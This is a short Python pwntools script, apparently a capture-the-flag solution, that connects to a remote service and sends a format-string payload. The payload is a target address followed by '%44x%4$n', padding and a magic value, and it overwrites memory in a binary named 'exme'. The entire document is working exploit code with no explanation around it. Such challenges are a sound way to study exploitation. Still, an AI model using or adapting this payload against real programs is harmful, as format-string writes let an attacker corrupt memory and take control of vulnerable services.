from pwn import *

s = remote("103.237.99.35", 26120)
#s = process("./exme")
s.recv()

c = 0x804a039
v4 = 0x62636465
payload = p32(c) + "%44x" + "%4$n" + "a"*28 + p32(v4)

s.sendline(payload)
s.recv()
print s.recv()

s.close()
